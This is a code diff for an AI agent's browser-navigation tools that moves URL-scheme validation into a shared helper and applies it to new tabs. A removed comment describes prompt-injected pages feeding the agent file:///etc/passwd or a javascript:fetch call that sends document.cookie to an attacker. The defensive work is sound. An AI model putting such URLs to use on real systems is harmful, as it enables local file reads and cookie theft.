@@ -28,6 +28,7 @@ import {
 } from "./core.js";
 import { takePageEvents } from "./popup-guard.js";
 import type { InteractiveElement } from "./types.js";
+import { unsafeBrowserUrl } from "../../security/url-safety.js";
 
 // Statuses that mean the site refused us (bot wall / rate limit / outage) — report as failure.
 const BLOCKING_STATUSES = new Set([403, 429, 503]);
@@ -73,27 +74,12 @@ export const browserNavigate: ToolDefinition = {
     },
     async handler(input) {
         try {
-            // URL scheme guard — reject file://, javascript:, data:, and any
-            // other non-HTTP(S) URI. A prompt-injected page or a misbehaving
-            // agent could otherwise hand us file:///etc/passwd (local read)
-            // or javascript:fetch(attacker+document.cookie) (XSS in the live
-            // browser context). We accept only http:// and https://.
             const urlRaw = String(input.url ?? "").trim();
             if (!urlRaw) {
                 return JSON.stringify({ error: "url is required" });
             }
-            let scheme: string;
-            try {
-                scheme = new URL(urlRaw).protocol.toLowerCase();
-            } catch {
-                return JSON.stringify({ error: `invalid url: ${urlRaw.slice(0, 120)}` });
-            }
-            if (scheme !== "http:" && scheme !== "https:") {
-                return JSON.stringify({
-                    error: `unsafe URL scheme "${scheme}" — only http(s) is allowed`,
-                    url: urlRaw.slice(0, 120),
-                });
-            }
+            const unsafe = unsafeBrowserUrl(urlRaw);
+            if (unsafe) return JSON.stringify({ error: unsafe, url: urlRaw.slice(0, 120) });
 
             // Resolve the backend FIRST via getActivePage() (see core.ts getActivePage):
             // calling getBrowser() up front would launch Playwright even when the
@@ -447,6 +433,8 @@ async function switchTabInChrome(input: Record<string, unknown>): Promise<string
         });
     }
     if (input.new_tab) {
+        const bad = input.url ? unsafeBrowserUrl(input.url as string) : null;
+        if (bad) return JSON.stringify({ error: bad });
         await sendBridgeCommand("navigate", { url: (input.url as string) || "about:blank", newTab: true });
         tabs = await list();
         return JSON.stringify({ success: true, action: "new_tab_opened", tabs: view(tabs) });
@@ -528,6 +516,8 @@ export const browserSwitchTab: ToolDefinition = {
 
             // Open new tab
             if (input.new_tab) {
+                const bad = input.url ? unsafeBrowserUrl(input.url as string) : null;
+                if (bad) return JSON.stringify({ error: bad });
                 const newPage = await context.newPage();
                 let navNote: string | null = null;
                 if (input.url) {
